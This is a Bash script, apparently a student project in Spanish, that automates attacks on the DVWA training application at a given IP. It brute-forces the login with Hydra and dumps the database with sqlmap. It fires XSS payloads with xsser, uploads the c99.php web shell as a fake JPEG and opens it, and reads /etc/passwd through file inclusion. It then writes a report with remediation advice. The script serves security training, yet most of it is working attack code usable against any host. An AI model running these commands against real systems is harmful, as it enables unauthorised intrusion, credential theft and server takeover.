#!/bin/bash

# El argumento de entrada para el script es la IP
if [ "$#" -lt "1" ]; then
	echo "Este script permite realizar las pruebas de un pentest para la aplicacion web DVWA. Evalua las vulnerabilidades de Sistema de Autenticacion, Inyeccion SQL, XSS, Inyeccion de Archivos y Referencia directa e insegura a objetos."
	echo "Como resultado el script devuelve un reporte que especifica que se encontro para cada vulnerabilidad, y adicionalmente unos reportes individuales mas detallados para cada vulnerabilidad, estos son generados por las herramientas que se usaron."
	echo "El script realiza un ataque por fuerza burta; por esto tiene una lista de los usuarios mas usados y un diccionario con password por defecto, si desea mejorar esto reemplaze los docs usersList y passwd.lst."
	echo "Debe correrse en un sistema operativo Kali"
	printf "\n"
	echo -e "SINTAXIS: \n"
	echo "./script ip nivelSeguridad"
	echo "----------------------------------------------------------------------------------------"
	echo "| PARAMETROS:                                                                          |"
	echo "| ip                     Direccion IP del servidor donde esta la aplicacion            |"
	echo "| nivelSeguridad         (Opcional) low (Por defecto)- medium - high (Beta)            |"
	echo "----------------------------------------------------------------------------------------"
	printf "\n"
	echo "AUTORES:"
	echo "Cristian Camilo Riaño	cristianriano@unicauca.edu.co"
	echo "Diego Alejandro Alvis	diegoalvis@unicauca.edu.co"
	printf "\n"
	echo "AGRADECIMIENTOS:"
	echo "SQLMAP (sqlmap.org)"
	echo "HYDRA  (sectools.org/tool/hydra/)"
	echo "XSSSER (xssser.sourceforge.net/)"
	exit
fi

if [ -z "$2" ]; then
	security="low"
else
	security=$2
fi

ip=$1
echo Empezando pentest
printf "\n"

#------------------------------------------------------------- SISTEMA DE AUTENTICACION ------------------------------------------------------

echo Atacando el sistema de autenticacion...
printf "\n"
printf "\n"
#Ataque con Hydra para el sistema de autenticacion
hydra $ip http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -L usersList -P password.lst -t 32 -e nsr | tee hydra.report

printf "\n"
printf "\n"

#Se obtienen los campos de usuario y password obtenidos
lista=($(grep login: hydra.report | cut -d' ' -f7,11))

descripcionAutenticacion="La aplicación permite intentar la autenticación de manera repetitiva sin ningún control.
Además las credenciales se transmiten por un canal inseguro"
impactoAutenticacion="Si no se utilizan buenas políticas para la creación de credenciales puede ser forzada cualquier cuenta. Incluso sin contar con el usuario.
También es posible estar a la espera de una autenticación exitosa y robar las credenciales."
recomendacionAutenticacion="Usar un protocolo de conexión segura como HTTPS para el ingreso y navegación de la aplicación.
Implementar los CAPTCHA para una autenticación que exceda los 5 intentos.
Diseminar políticas robustas en el manejo de credenciales con los usuarios (contraseñas de al menos 8 caracteres, con números, etc.)"

#Se verifica que halla al menos un usuario
if [ "${#lista[@]}" -lt "2" ]; then
	cookie=0
	echo "Fallo, porfavor revise la lista de usuarios o la lista contraseñas"
	autenticacion=false
	exit
else
	#Se obtiene la cookie para ingreso
	cookie=`curl http://$ip/dvwa/login.php --user-agent Mozilla/5.0 --data "username=${lista[0]}&password=${lista[1]}&Login=Login" -v 2>&1 | grep PHPSESSID | cut -d'=' -f2 | cut -d';' -f1`
	echo Exito! Cookie de acceso: PHPSESSID=$cookie
	autenticacion=true
fi
sleep 2

#------------------------------------------------------------- INYECCION SQL ----------------------------------------------------------------

printf "\n"
clear
echo Realizando Inyecciones SQL...
sleep 2
#Inyeccion SQL. Prueba que tipo de ataques es vulnerable
sqlmap -u "$ip/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p "id" --cookie "security=$security; PHPSESSID=$cookie" --dbs -D dvwa --dump -v 0 --answers "proceed=C,*=n,parameter=N,hash=N, crack=n" | tee sqlInjection.report

printf "\n"
printf "\n"

#Saca del resporte los tipos de inyeccion
lista=($(grep "Type:" sqlInjection.report | cut -d':' -f2))

descripcionSql="La aplicacion no presenta ningún tipo de validación para los datos que se usan como consulta en la BD"
impactoSql="Por medio de consultas manipuladas puede obtenerse toda la información de la BD, no solo la concerniente a la aplicación; también la información de otras instancias que allí se ejecuten"
recomendacionSql="Personalizar las pantallas de error que arroja el servidor, para evitar mostrar los mensajes de la BD.
Validar los datos antes de realizar la consulta, quitando caracteres de control como: # ; AND = OR) ( u otras palabras reservadas para el motor de búsquedas.
Hacer uso de los procedimientos almacenados de MySQL"

resultSql="La aplicacion es vulnerable a inyeccion sql. Presenta los siguientes tipos de inyeccion: \n"

for i in ${lista[@]}; do
	resultSql="$resultSql$i, "
done
echo $resultSql

#------------------------------------------------------------- XSS -------------------------------------------------------------------------

printf "\n"
sleep 4
clear

echo "Probando XSS..."
sleep 2
# Realiza la inyeccion de distintos tipos de XSS usando codificacion Hexadecimal
xsser -u "http://$ip" -g "/dvwa/vulnerabilities/xss_r/?name=" --cookie "PHPSESSID=$cookie; security=$security" --Hex -s --auto | tee xss.report

printf "\n"
printf "\n"

exitosXss=`grep "Failed:" xss.report| cut -s -d'|' -f2 | cut -d' ' -f3`

descripcionXss="La aplicación muestra datos proporcionados por el usuario sin ningún tipo de validación, permitiendo insertar codigo malicioso"
impactoXss="El impacto de esta vulnerabilidad se ve en el lado del cliente; permite manipular el navegador de los usuarios de la aplicación; y así, interceptar comunicaciones, manipular cámara y micrófono, robo de credenciales (no solo de la aplicación), etc"
recomendacionXss="Enviar credenciales (cookies) del tipo HttpOnly.
Validar los datos antes de ser impresos en algún sector de la página, evitar caracteres como: <, >, /, {, }. O longitudes exageradas (escapar caracteres especiales)"

if [ "$exitosXss" == "0" ] || [ "$security" == "high" ]; then
	xss=false
	echo "No se pudo vulnerar"
else
	xss=true
	echo "Vulnerable a XSS. Se hicieron $exitosXss pruebas"
fi

#------------------------------------------------------------- INYECCION ARCHIVOS -----------------------------------------------------------

sleep 2
printf "\n"
clear
echo "Realizando pruebas inyeccion de archivos..."

#Se intenta subir el archivo malicioso
criterio=`curl "http://$ip/dvwa/vulnerabilities/upload/" --cookie "PHPSESSID=$cookie; security=$security" --form "uploaded=@c99.php;type=image/jpeg" --form Upload=Upload --form MAX_FILE_SIZE=100000 -v 2>&1 | grep "succesfully"`

printf "\n"
printf "\n"

descripcionUpload="DVWA permite subir en el servidor web cualquier tipo de archivos sin realizar una correcta validación"
impactoUpload="No realizar validación sobre el tipo de archivos que se suben al servidor hace que maliciosos entren en el servidor y sean ejecutados estos archivos puede hacer que se ejecute un ataque de Shell a través de Backdoor que con ayuda de otras herramientas pueden llegar a dar control total sobre el servidor."
recomendacionUpload="Validar el tipo de archivo que se sube al servidor, no solo la extensión sino el content-type.
Hacer uso de restricciones en el tamaño del archivo y utilizar un servidor aislado para el almacenamiento de contenido.
Hacer uso correcto de los permisos y privilegios para evitar la ejecución de scripts subidos"

#Se verifica si hay notificacion succesful 
if [ ${#criterio} == 0 ]; then
	echo "No se pudo vulnerar"
	upload=false
else
	echo "Upload File Vulnerado, se abrira el navegador con el script C99"
	upload=true
	iceweasel $ip/dvwa/hackable/uploads/c99.php &
fi

#------------------------------------------------------------- DIRECTORIO TRANSVERSAL --------------------------------------------------------

printf "\n"
echo "Haciendo pruebas de referencia, directa e insegura a objetos (Directorio Transversal)..."

# Peticion GET para acceder a archivos sensibles del sistema
curl -s http://$ip/dvwa/vulnerabilities/fi/?page=/etc/passwd --cookie "PHPSESSID=$cookie; security=$security" | cut -d '<' -f 1 > transversal.report

password=`cat transversal.report`

descripcionTransversal="DVWA referencia de forma directa y sin validación hacia paginas externas y rutas locales en el servidor"
impactoTransversal="La referencia hacia páginas web sin previa validación hace que la aplicación se re direccione hacia sitios web poco confiables que pueden ocasionar daño sobre la aplicación. De la misma forma no realizar validación sobre el vínculo al que se está re direccionando permite que se incrusten rutas locales de archivos con información confidencial la cual es mostrada en la aplicación. Sin embargo al ser explotada esta vulnerabilidad no brinda control sobre el servidor"
recomendacionTransversal="Procesar las peticiones de enlaces externos para que no resulten en una petición de un fichero.
Establecer configuración de permisos para que solo los archivos pertinentes a la aplicación puedan ser accedidos.
Filtrar de forma adecuada el tipo de caracteres o palabras dentro de la petición del usuario"

# Se verifica si se accedio al archivo de contraseñas, o si por permisos no se puede acceder
if [ "${#password}" -gt "25" ]; then
	echo "Directorio Transversal Vulnerado, revise el archivo de contraseñas obtenido al final del reporte"
	transversal=true
else
	echo "No Vulnerado"
	transversal=false
fi

# Se genera el reporte
echo -e Sistema de Autenticacion: "\n" > reporte
if $autenticacion; then
	echo -e "\tDescripcion: \n" $descripcionAutenticacion >> reporte
	echo -e "\tImpacto: \n" $impactoAutenticacion >> reporte
	echo -e "\tRecomendaciones: \n" $recomendacionAutenticacion >> reporte
	printf "\n \n" >> reporte
fi

echo -e Inyeccion SQL: "\n" >> reporte
echo -e "\tDescripcion: \n" $descripcionSql >> reporte
echo -e "\tImpacto: \n" $impactoSql >> reporte
echo -e "\tRecomendaciones: \n" $recomendacionSql >> reporte
printf "\n \n" >> reporte

echo -e XSS: "\n" >> reporte
if $xss; then
	echo -e "\tDescripcion: \n" $descripcionXss >> reporte
	echo -e "\tImpacto: \n" $impactoXss >> reporte
	echo -e "\tRecomendaciones: \n" $recomendacionXss >> reporte
	printf "\n \n" >> reporte
fi

echo -e Inyeccion de archivos: "\n" >> reporte
if $upload; then
	echo -e "\tDescripcion: \n" $descripcionUpload >> reporte
	echo -e "\tImpacto: \n" $impactoUpload >> reporte
	echo -e "\tRecomendaciones: \n" $recomendacionUpload >> reporte
	printf "\n \n" >> reporte
fi

echo -e Directorio Transversal: "\n" >> reporte
if $transversal; then
	echo -e "\tDescripcion: \n" $descripcionTransversal >> reporte
	echo -e "\tImpacto: \n" $impactoTransversal >> reporte
	echo -e "\tRecomendaciones: \n" $recomendacionTransversal >> reporte
	printf "\n \n" >> reporte
fi

printf "\n \n \n" >> reporte
echo -e "----------------------------------- HYDRA -------------------------------------------------" >> reporte
cat hydra.report >> reporte
printf "\n \n" >> reporte
echo -e "----------------------------------- SQLMAP -------------------------------------------------" >> reporte
cat sqlInjection.report >> reporte
printf "\n \n" >> reporte
echo -e "----------------------------------- XSSSER -------------------------------------------------" >> reporte
cat xss.report >> reporte
printf "\n \n" >> reporte
echo -e "----------------------------------- TRANSVERSAL -------------------------------------------------" >> reporte
cat transversal.report >> reporte
printf "\n \n" >> reporte


rm hydra.report
rm sqlInjection.report
rm transversal.report
rm xss.report

printf "\n \n"
echo "Pentest finalizado. Revise el reporte"
exit
